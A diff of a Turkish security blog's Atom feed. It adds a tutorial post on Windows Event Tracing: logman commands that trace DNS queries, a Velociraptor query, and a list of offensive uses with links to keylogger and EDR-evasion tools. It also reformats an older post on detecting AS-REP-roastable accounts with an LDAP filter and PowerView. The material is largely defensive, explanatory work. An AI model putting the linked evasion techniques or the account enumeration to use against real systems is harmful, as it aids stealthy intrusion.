@@ -1,5 +1,132 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Enes Ergün - siber güvenlik</title><link href="https://enesergun.net/" rel="alternate"></link><link href="https://enesergun.net/feeds/siber-guvenlik.atom.xml" rel="self"></link><id>https://enesergun.net/</id><updated>2020-08-14T18:32:00+03:00</updated><subtitle>Personel homepage about of my Profession</subtitle><entry><title>AS-Rep Roasting Saldırısı, Saldırıyı anlamak ve Tespiti</title><link href="https://enesergun.net/as-rep-roasting-saldirisi-saldiriyi-anlamak-ve-tespiti.html" rel="alternate"></link><published>2020-08-14T18:32:00+03:00</published><updated>2020-08-14T18:32:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2020-08-14:/as-rep-roasting-saldirisi-saldiriyi-anlamak-ve-tespiti.html</id><summary type="html">&lt;h1&gt;Giriş&lt;/h1&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Enes Ergün - siber güvenlik</title><link href="https://enesergun.net/" rel="alternate"></link><link href="https://enesergun.net/feeds/siber-guvenlik.atom.xml" rel="self"></link><id>https://enesergun.net/</id><updated>2022-02-06T18:00:00+03:00</updated><subtitle>Personel homepage</subtitle><entry><title>Ferrarisini satan ETW (Event Tracing for Windows)</title><link href="https://enesergun.net/ferrarisini-satan-etw-event-tracing-for-windows.html" rel="alternate"></link><published>2022-02-06T18:00:00+03:00</published><updated>2022-02-06T18:00:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2022-02-06:/ferrarisini-satan-etw-event-tracing-for-windows.html</id><summary type="html">&lt;blockquote&gt;
+&lt;p&gt;Satan kelimesinin gizli bir anlamı yoktur tıpkı araç plakamın sonunun 666 olması gibi.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Selamlar öncelikle. Nasılsınız? Her telden çalan bir insan olduğum için bugün de (1 yıl sonra) tamamen farklı bir konu üzerinden bahsetmek istiyorum. Kendisini çeşitli mail listelerini takip ederken tanıdım. İlgimi çekti ve araştırıp bunun yazısını yazmak istedim …&lt;/p&gt;</summary><content type="html">&lt;blockquote&gt;
+&lt;p&gt;Satan kelimesinin gizli bir anlamı yoktur tıpkı araç plakamın sonunun 666 olması gibi.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Selamlar öncelikle. Nasılsınız? Her telden çalan bir insan olduğum için bugün de (1 yıl sonra) tamamen farklı bir konu üzerinden bahsetmek istiyorum. Kendisini çeşitli mail listelerini takip ederken tanıdım. İlgimi çekti ve araştırıp bunun yazısını yazmak istedim. Birbirimizi sevebileceğimizi umuyorum. &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;İş bu blog konusu size hiç bir uzmanlık vermeyecektir, vermeyi tahahhüd etmemektedir. Türkiye piyasasında bir kaç kişi/grup harici genelde teknolojiyi takip eden tarafta olduğumuz için(keşke Numan olsam :D) pek tabii internette okuyup özetini çıkarttığım bilgileri sizlere sağlamış olacağım diye düşünüyorum.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;O zaman giriş yapalım. Kağan'dan önce yazmak için bazı konuları atlamış, kaçırmış olabilirim. Affınıza sığınıyorum. (Ulan bir blog konusu yazıyorsun bari bir şeyleri tam yap diyenleri &lt;a href="https://youtu.be/dQw4w9WgXcQ"&gt;şuraya alalım.&lt;/a&gt; )&lt;/p&gt;
+&lt;h2&gt;ETW Ne Demekti? Sevgi demekti, Emek demekti.&lt;/h2&gt;
+&lt;p&gt;&lt;a href="https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing"&gt;Bknz:About Event Tracing&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Kendisinin açılımı Event Tracing For Windowstur. Kendisi çekirdekteki veya uygulama tanımlı olayları log dosyası veya real time olarak takip etmenize olanak sağlayan verimli bir yöntemdir. Kendisi/kendileri sistemi yeniden başlatmadan tracing'i(takip, izleme) aktif veya pasif hale getirebilmenize olanak sağlayabilen oldukça kullanışlı(Belki de tehlikeli) bir özelliktir. &lt;/p&gt;
+&lt;p&gt;Kıymetlilerimiz 3 ana parçaya sahiptir. Bunlar:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Controller&lt;/strong&gt;: İzleme başlatabilen, etkinleştirebilen, devre dışı bırakabilen uygulamalardır.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Providers&lt;/strong&gt;: Log oluşturan uygulamalar vs.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Consumers&lt;/strong&gt;: Providerlar tarafından loglari, aktiviteleri dinleyen abone(??) olan uygulamalardır. &lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Bu 3 madde harici ayrıca bilmemiz gereken bazı keyword(anahtar terimler) de var tabii. &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Tracing Session&lt;/strong&gt;: Bir veya birden fazla providerdan gelen olayları kaydeden mekanizmadır/uygulamadır.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Keywords&lt;/strong&gt;: Consumerlara bilgiyi sağlayan olay türleridir. Burası önemli.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;ETW üzerinde çok önemli 2 fonksiyon bulunmaktadır. Bunlar: 1.NTTraceControl(Trace fonksiyonlarını yönetiyor) 2. NtTraceEvent (Aktiviteleri/Eventleri yazıyor.)&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;NTSTATUS&lt;/span&gt;
+&lt;span class="n"&gt;NtTraceControl&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
+    &lt;span class="n"&gt;ULONG&lt;/span&gt; &lt;span class="n"&gt;FunctionCode&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="n"&gt;PVOID&lt;/span&gt; &lt;span class="n"&gt;InBuffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="n"&gt;ULONG&lt;/span&gt; &lt;span class="n"&gt;InBufferLen&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="n"&gt;PVOID&lt;/span&gt; &lt;span class="n"&gt;OutBuffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="n"&gt;ULONG&lt;/span&gt; &lt;span class="n"&gt;OutBufferLen&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="n"&gt;ULONG&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;ReturnSize&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+&lt;span class="n"&gt;NTSTATUS&lt;/span&gt;
+&lt;span class="n"&gt;NtTraceEvent&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
+    &lt;span class="n"&gt;HANDLE&lt;/span&gt; &lt;span class="n"&gt;TraceHandle&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="n"&gt;ULONG&lt;/span&gt; &lt;span class="n"&gt;Flags&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="n"&gt;ULONG&lt;/span&gt; &lt;span class="n"&gt;FieldSize&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="n"&gt;PVOID&lt;/span&gt; &lt;span class="n"&gt;Fields&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Bu kadar teori yeter. Şimdi biraz da pratik kısmına bakalım.&lt;/p&gt;
+&lt;h2&gt;ETW Providerları Görmek&lt;/h2&gt;
+&lt;p&gt;Sisteminiz üzerindeki providerları görebilmek için sistem üzerinde komut istemcisine(command prompt, powershell vb.) &lt;code&gt;logman providers&lt;/code&gt; yazdığınızda sistem üzerinde zibilyon tane provider görebilirsiniz. Ben PowerShell üzerinde measure dediğimde 1149 tane provider görüyorum. &lt;/p&gt;
+&lt;p&gt;&lt;img alt="image-20220206165502609" src="images/image-20220206165502609.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image-20220206165404280" src="images/image-20220206165404280.png"&gt;&lt;/p&gt;
+&lt;p&gt;İlk ekran görüntüsündeki çıktıda GUID'leri görüyoruz. Bizim için asıl önemli olanlar bunlardır. Bir provider'a subscribe(kayıt/abone/hook ne derseniz artık) olurken kullanacağımız keywordleri bu GUID'i sorgulayarak yapacağız. Pek tabii bu providerları tek tek terminal üzerinden kontrol etmek istemeyebilirsiniz. Bunun için geliştirimiş bazı araçlar bulunmaktadır. Ben genel olarak makalelerde "EtwExplorer" kullanıldığını görmekteyim. Aşağıda ekran görüntülerini ekliyor olacağım.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image-20220206165808464" src="images/image-20220206165746333.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image-20220206165849819" src="images/image-20220206165849819.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image-20220206165935681" src="images/image-20220206165935681.png"&gt;&lt;/p&gt;
+&lt;p&gt;Burada işaretli alan oldukça önemli. Microsoft-Windows-Kernel-Process Provider'ına ait template'i XML biçiminde görüyorsunuz. Subscribe olduğumuzda işaretli alandan nelere subscribe olacağımızı seçeceğiz. Bu kısımda verdiğimiz değerler toplama olarak gidiyor bu arada. Mesela "0x10, 0x20, 0x40"a subscribe olacağımızı düşünrsek &lt;code&gt;0x70&lt;/code&gt; yazabiliriz. &lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Uygulamayı geliştiren Pavel abimize saygılar. Kendisi Windows SysInternals kitaplarının yazarı olmakla birlikte Pentester Academyde de eğitmenlik yapmış birisi. Daha fazlasını öğrenmek isterseniz size kalmış araştırabilirsiniz.&lt;/strong&gt;&lt;/p&gt;
+&lt;h2&gt;ETW üzerinde Subscribe Olmak&lt;/h2&gt;
+&lt;p&gt;Şimdi işimize uygun olan provider'ı seçtik diyelim. Bu provider'a subscribe olmak için bizim bir &lt;code&gt;trace session&lt;/code&gt;a ihtiyacımız var. Bu sebeple logman üzerinden bu session'ı oluşturmalıyız. Varolan sessionları listelemek için aşağıdaki komutu yazabilirsiniz.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;logman&lt;/span&gt; &lt;span class="n"&gt;query&lt;/span&gt; &lt;span class="n"&gt;-ets&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Hadi bir trace session oluşturalım.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;logman&lt;/span&gt; &lt;span class="n"&gt;create&lt;/span&gt; &lt;span class="n"&gt;trace&lt;/span&gt; &lt;span class="n"&gt;enesindnsleri&lt;/span&gt; &lt;span class="n"&gt;-ets&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Şimdi bunu yazdığımızda aşağıdaki sonuca erişmiş olmamız lazım.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image-20220206171339464" src="images/image-20220206171339464.png"&gt;&lt;/p&gt;
+&lt;p&gt;Ama şu an tamamen kullanışsız çünkü herhangi bir provider'a subscribe olmadık. Ben sistem üzerindeki DNS çağrılarımı görmek istiyorum. Çağrıdan kastım DNS istekleri. Bunun için önce hangi provider olduğunu bulmam lazım.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;logman&lt;/span&gt; &lt;span class="n"&gt;query&lt;/span&gt; &lt;span class="n"&gt;providers&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nb"&gt;Select-String&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;dns&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;yazdığımda bana &lt;/p&gt;
+&lt;p&gt;&lt;code&gt;{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D}&lt;/code&gt; GUID'sini verdi. Ben buna subscribe olacağım. Herhangi bir keyword vermeyeceğim bu sebeple direkt olarak aşağıdaki gibi bir komut çalıştırarak benim trace session'ıma provider'ı subscribe edeceğim. Dilerseniz siz fazladan/başka providerlar da ekleyebilirsiniz.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;logman&lt;/span&gt; &lt;span class="n"&gt;update&lt;/span&gt; &lt;span class="n"&gt;enesindnsleri&lt;/span&gt; &lt;span class="n"&gt;-p&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Microsoft-Windows-DNS-Client&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;-ets&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Bakalım subscribe olabildik mi?&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;logman&lt;/span&gt; &lt;span class="n"&gt;query&lt;/span&gt; &lt;span class="n"&gt;enesindnsleri&lt;/span&gt; &lt;span class="n"&gt;-ets&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Çıktımız: &lt;/p&gt;
+&lt;p&gt;&lt;img alt="image-20220206173433760" src="images/image-20220206173433760.png"&gt;&lt;/p&gt;
+&lt;p&gt;Burada kendisi bir output belirledi ve keyword olarak All  olarak algıladı fakat .etl dosyamda nedense hata verdi. Bende bu sebeple şöyle bir yola gittim. Siz de dilerseniz output çıktısını değiştirebilirsiniz. Daha fazlası için&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/logman"&gt;Windows Docs for Logman&lt;/a&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;logman update enesindnsleri -ow -o C:\Users\Enes\enesdns1.etl -p &amp;quot;Microsoft-Windows-DNS-Client&amp;quot; 0x10 -ets&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="image-20220206175045137" src="images/image-20220206175045137.png"&gt;&lt;/p&gt;
+&lt;p&gt;Şimdi bir de çıktı dosyamıza bakalım. &lt;/p&gt;
+&lt;p&gt;&lt;img alt="image-20220206180844358" src="images/image-20220206180420094.png"&gt;&lt;/p&gt;
+&lt;p&gt;Gördüğünüz gibi arkada Discord açık olduğu için Discord'un CDN sunucuları için bir DNS sorgusu atmışım. Pek tabi bu görüntüler takip açısından çok verimli değil ama bu kısımda Velociraptor kullanabilirsiniz. Bununla ilgili bir linki kullanabileceğiniz kaynaklar altına ekleyeceğim. Daha doğrusu tam halini ekleyeceğim.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image-20220206181901173" src="images/image-20220206181901173.png"&gt;&lt;/p&gt;
+&lt;p&gt;Velociraptor VQL'i:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="k"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;TimeStamp&lt;/span&gt; &lt;span class="k"&gt;AS&lt;/span&gt; &lt;span class="k"&gt;Timestamp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+       &lt;span class="n"&gt;EventData&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;QueryName&lt;/span&gt; &lt;span class="k"&gt;AS&lt;/span&gt; &lt;span class="n"&gt;Query&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+       &lt;span class="n"&gt;EventData&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;QueryType&lt;/span&gt; &lt;span class="k"&gt;AS&lt;/span&gt; &lt;span class="k"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+       &lt;span class="n"&gt;EventData&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;QueryResults&lt;/span&gt; &lt;span class="k"&gt;AS&lt;/span&gt; &lt;span class="n"&gt;Answer&lt;/span&gt;
+&lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;watch_etw&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;guid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="k"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;3020&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Peki şimdi işin bu kısmını hallettik diyelim. Bu ne işimize yarayacak?  Bununla ilgili gördüğüm örnekler: &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;USB Provider'ını kullanarak keylogger&lt;/li&gt;
+&lt;li&gt;ETW kullanarak uygulamalarınızı gizleme&lt;/li&gt;
+&lt;li&gt;Enumeration/Cihaz keşfi sırasında WMI'a nazaran daha az görünürlük. (Tespit edilememe)&lt;/li&gt;
+&lt;li&gt;AV? AV Bypass&lt;/li&gt;
+&lt;li&gt;.NET Developerlar için uygulama performans analizi&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;konularına odaklanmış gibiydi. Benim de yeni öğrendiğim bir konu ve terim oldu. Hatta bu zamana kadar ETW'yi hiç duymamıştım. Ufkunuz açıldıysa ne mutlu bana!&lt;/p&gt;
+&lt;p&gt;İlgili maddelerle alakalı kullanabileceğiniz, detayına inebileceğiniz veya bu bana yetmedi dediğiniz yerlerde aşağıdaki linkleri kullanabilirsiniz.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://cyberpointllc.com/blog-posts/cp-logging-keystrokes-with-event-tracing-for-windows-etw.php"&gt;Keylogging&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://sudonull.com/post/13104-Event-Tracing-for-Windows-on-the-side-of-evil-But-it-is-not-exactly"&gt;Keylogging[1]&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/CyberPoint/ETWKeyLogger_PSE"&gt;Source code for Keylogger&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://velociraptor.velocidex.com/event-tracing-for-windows-41eb031abd69"&gt;Velociraptor Event Tracing For Windows&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.binarydefense.com/using-sysmon-and-etw-for-so-much-more/"&gt;Sysmon and ETW for so Much More&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://twitter.com/Arkbird_SOLG/status/1441876714246885381"&gt;Enumeration&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://i.blackhat.com/EU-21/Wednesday/EU-21-Teodorescu-Veni-No-Vidi-No-Vici-Attacks-On-ETW-Blind-EDRs.pdf"&gt;Blackhat Blind EDR&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Evasion/ETW.cs"&gt;Sharpsploit tarafından ETW kullanarak nasıl Evasion yapıldığını görmek için&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/optiv/ScareCrow"&gt;Yine ETW kullanabilen bir Framework&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Bir klasik olarak yazı sonu şarkısını da aşağıya ekliyor olacağım.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=Qm7mZkEQCaY" title="Ateş Olsan - Bubituzak"&gt;&lt;img alt="Ateş Olsan - Bubituzak" src="https://res.cloudinary.com/marcomontalbano/image/upload/v1644161493/video_to_markdown/images/youtube--Qm7mZkEQCaY-c05b58ac6eb4c4700831b2b3070cd403.jpg"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;Referanslar&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://renenyffenegger.ch/notes/Windows/ETW/index"&gt;ETW&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101"&gt;ETW Event Tracing For Windows 101&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://ruxcon.org.au/assets/2016/slides/ETW_16_RUXCON_NJR_no_notes.pdf"&gt;Make ETW Great Again&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="http://www.irongeek.com/i.php?page=videos/derbycon7/s25-tracing-adversaries-detecting-attacks-with-etw-matt-hastings-dave-hull"&gt;Derbycon Detecting Attacks with ETW&lt;/a&gt;&lt;/p&gt;</content><category term="siber güvenlik"></category><category term="ETW"></category><category term="Event Tracing for Windows"></category><category term="ETW Türkçe"></category><category term="ETW Hack"></category><category term="ETW Bypass"></category><category term="ETW Evasion"></category><category term="ETW Blue Team"></category><category term="ETW Red Team"></category><category term="Event Tracing for Windows Türkçe"></category></entry><entry><title>AS-Rep Roasting Saldırısı, Saldırıyı anlamak ve Tespiti</title><link href="https://enesergun.net/as-rep-roasting-saldirisi-saldiriyi-anlamak-ve-tespiti.html" rel="alternate"></link><published>2020-08-14T18:32:00+03:00</published><updated>2020-08-14T18:32:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2020-08-14:/as-rep-roasting-saldirisi-saldiriyi-anlamak-ve-tespiti.html</id><summary type="html">&lt;h1&gt;Giriş&lt;/h1&gt;
 &lt;p&gt;Selamlar, bu aralar Active Directory tarafında ki saldırı vektörleri veya bunların tespiti ilgimi oldukça fazla çekiyor. Bazı kişi ve yayınları liste dışı tutarak bizim sektörde genel kitlenin hep Linux'a yönlendirildiğini görüyorum/uz bana göre bu biraz hatalı bir yönlendirme gibi geliyor. Çünkü ileride Internal Pentester/Red Team olacak kişi …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Giriş&lt;/h1&gt;
 &lt;p&gt;Selamlar, bu aralar Active Directory tarafında ki saldırı vektörleri veya bunların tespiti ilgimi oldukça fazla çekiyor. Bazı kişi ve yayınları liste dışı tutarak bizim sektörde genel kitlenin hep Linux'a yönlendirildiğini görüyorum/uz bana göre bu biraz hatalı bir yönlendirme gibi geliyor. Çünkü ileride Internal Pentester/Red Team olacak kişi birden kurumsal ortamı görünce kelimenin tam anlamıyla &lt;code&gt;sudan çıkmış balığa&lt;/code&gt; dönüyor (Like me). Çoğu zaman da feed listemde benzer yazılar görüyorum fakat bu yazıları &lt;code&gt;Türkçe&lt;/code&gt; kaynaklarda arattığımda herhangi bir sonuca ulaşamıyorum. Bu sebeple ilgili yazıyı biraz çeviri biraz araştırma biraz da kendimin kattığı şeyler ile hazırlamak istedim. Aslında işin teknik kısmı çok da uzun değil fakat öncesinde bilinmesi gerekenler uzun sanırım :)&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Bir hata vs. görürseniz bildirmekten çekinmezseniz sevinirim. Hadi başlayalım.&lt;/strong&gt;&lt;/p&gt;
@@ -23,36 +150,33 @@
 &lt;p&gt;&lt;a href="https://tools.ietf.org/html/rfc4120"&gt;The Kerberos Network Authentication Service (V5)&lt;/a&gt;&lt;/p&gt;
 &lt;h2&gt;Kapalı Kullanıcıların Tespiti&lt;/h2&gt;
 &lt;p&gt;Eğer bir kullanıcının &lt;code&gt;Pre Authentication Required&lt;/code&gt; seçeneği disable'a çekilmişse aşağıda ki gibi bir log üretmektedir. &lt;code&gt;0x10&lt;/code&gt; değeri disabled hali &lt;code&gt;0x10010&lt;/code&gt; değeri ise enabled halidir. Bizim burada yakalamamız gereken değer &lt;code&gt;Enabled&lt;/code&gt; olduğunda kural üretmektir. &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Old UAC Value:      0x10
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;Old&lt;/span&gt; &lt;span class="n"&gt;UAC&lt;/span&gt; &lt;span class="n"&gt;Value&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;      &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x10&lt;/span&gt;
 
-    New UAC Value:      0x10010
+    &lt;span class="k"&gt;New&lt;/span&gt; &lt;span class="n"&gt;UAC&lt;/span&gt; &lt;span class="n"&gt;Value&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;      &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x10010&lt;/span&gt;
 
-    User Account Control:   
+    &lt;span class="k"&gt;User&lt;/span&gt; &lt;span class="n"&gt;Account&lt;/span&gt; &lt;span class="n"&gt;Control&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   
 
-        &amp;#39;Don&amp;#39;t Require Preauth&amp;#39; - Enabled
+        &lt;span class="s1"&gt;&amp;#39;Don&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="n"&gt;Require&lt;/span&gt; &lt;span class="n"&gt;Preauth&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Enabled&lt;/span&gt;
 
-    User Parameters:    -
+    &lt;span class="k"&gt;User&lt;/span&gt; &lt;span class="k"&gt;Parameters&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;    &lt;span class="o"&gt;-&lt;/span&gt;
 
-    SID History:        -
+    &lt;span class="n"&gt;SID&lt;/span&gt; &lt;span class="n"&gt;History&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;        &lt;span class="o"&gt;-&lt;/span&gt;
 
-    Logon Hours:        -
-&lt;/pre&gt;&lt;/div&gt;
-
+    &lt;span class="n"&gt;Logon&lt;/span&gt; &lt;span class="n"&gt;Hours&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;        &lt;span class="o"&gt;-&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img alt="DC Log" src="images/dclog.png"&gt;&lt;/p&gt;
 &lt;p&gt;Eğer loglardan değil de bulunduğunuz bir sistem üzerinde tespit etmek isterseniz de 2 seçeneğimiz bulunuyor.&lt;/p&gt;
 &lt;p&gt;LDAP Toolkit indirerek DC üzerinde aşağıdaki sorgu ile kontrol edebilirsiniz. Burada PreauthNoRequired kısmını sorgulayan asıl kod &lt;code&gt;userAccountControl:1.2.840.113556.1.4.803:=4194304&lt;/code&gt; kısmıdır.
 LDAP:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;searchBase=&amp;quot;DC=EXAMPLE,DC=COM&amp;quot; filer=&amp;quot;(&amp;amp;amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;quot; scope=&amp;quot;SUBTREE&amp;quot; timeLimit=&amp;quot;0&amp;quot; countLimit=&amp;quot;1000&amp;quot; aliasesDereferencingMethod=&amp;quot;ALWAYS&amp;quot; referralsHandlingMethod=&amp;quot;IGNORE&amp;quot;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;searchBase=&amp;quot;DC=EXAMPLE,DC=COM&amp;quot; filer=&amp;quot;(&amp;amp;amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;quot; scope=&amp;quot;SUBTREE&amp;quot; timeLimit=&amp;quot;0&amp;quot; countLimit=&amp;quot;1000&amp;quot; aliasesDereferencingMethod=&amp;quot;ALWAYS&amp;quot; referralsHandlingMethod=&amp;quot;IGNORE&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;PowerShell üzerinde ise &lt;code&gt;Get-DomainUser -PreauthNoRequired&lt;/code&gt; sorgusu ile domain üzerinde ki kullanıcıları listeleyebilirsiniz.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Domain User" src="images/GetDomainUser.png"&gt;&lt;/p&gt;
 &lt;p&gt;Daha fazlası için: &lt;a href="https://ldapwiki.com/wiki/Active%20Directory%20RISK%20Related%20Searches"&gt;LDAPWiki Risks Pre-Authentication&lt;/a&gt;&lt;/p&gt;
